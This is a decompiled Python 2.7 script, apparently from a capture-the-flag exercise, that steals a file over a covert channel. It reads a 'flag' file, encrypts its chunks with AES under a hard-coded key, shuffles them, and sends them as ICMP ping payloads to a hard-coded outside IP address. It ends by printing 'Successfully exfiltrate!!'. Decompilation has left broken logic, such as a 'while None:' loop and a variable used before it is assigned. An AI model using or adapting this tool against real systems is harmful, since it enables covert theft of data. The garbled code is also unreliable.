# Visit https://www.lddgo.net/en/string/pyc-compile-decompile for more information
# Version : Python 2.7

from math import sqrt
from random import shuffle
from scapy.all import sr1, IP, ICMP
from Crypto import Random
from Crypto.Cipher import AES
import sys
import os
import time

class Helper:
    
    def __init__(self, content):
        self.content = content

    
    def nextSquare(self):
        x = 0
        while None:
            yield 2 ** x
            x += 1

    
    def scramble(self):
        bound = int(sqrt(len(self.content))) * 10
        count = 0
        pos = 0
        tree = []
        for iteration in self.nextSquare():
            tmp = []
            if iteration > 1:
                ins = tree[-iteration / 2:]
            debug = 0
            for n in range(iteration):
                if pos < len(self.content) or iteration > 1:
                    if len(ins) == 1:
                        tree.append(ins + [
                            self.content[pos]])
                    else:
                        tree.append(ins[debug % iteration / 2] + [
                            self.content[pos]])
                        debug += 1
                else:
                    tree.append(self.content[pos])
                pos += 1
            
            if iteration > bound:
                break
            count += 1
        
        yield tree



def encrypt(raw):
    
    pad = lambda x: x + '\x00' * (256 - len(x))
    iv = Random.new().read(AES.block_size)
    key = 'The Bloodharbor!'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return 'exfil-' + iv + cipher.encrypt(pad(raw))


def wrap(raw, size = 256):
    return [ raw[x:x + size] for x in range(0, len(raw), size) ]


def request(tree, dest = '172.67.139.222'):
    vals = [ (x, z) for x, y in tree.items() for z in y ]
    shuffle(vals)
    count = 0
    for val in vals:
        key = val[0]
        enum = val[-1][-1]
        data = val[-1][0][-1]
        ping = IP(dst = dest) / ICMP(id = key, seq = enum) / data
        sr1(ping, verbose = 0)
        if not (count % 150) and count != 0:
            time.sleep(2)
        print count, '/', len(vals)
        count += 1
    

if __name__ == '__main__' and os.path.exists(sys.argv[1]):
    flag = open(sys.argv[1], 'rb').read()
    flag = [ encrypt(x) for x in wrap(flag) ]
    inst = Helper(flag)
    tree = dict()
    iden = 1
    for x in inst.scramble():
        for y in x:
            if not isinstance(y, list):
                tree[1] = [
                    [
                        [
                            y],
                        0]]
                continue
            key = tree.get(len(y), list())
            if not key:
                tree[len(y)] = key
            if not len(y) % 2:
                key.append([
                    y,
                    len(key)])
            else:
                key.insert(0, [
                    y,
                    len(key)])
            if iden != len(y):
                for z, zz in enumerate(tree[iden]):
                    tree[iden][z][1] = z
                
            iden = len(y)
        
    
    request(tree)
    print 'Successfully exfiltrate!!'
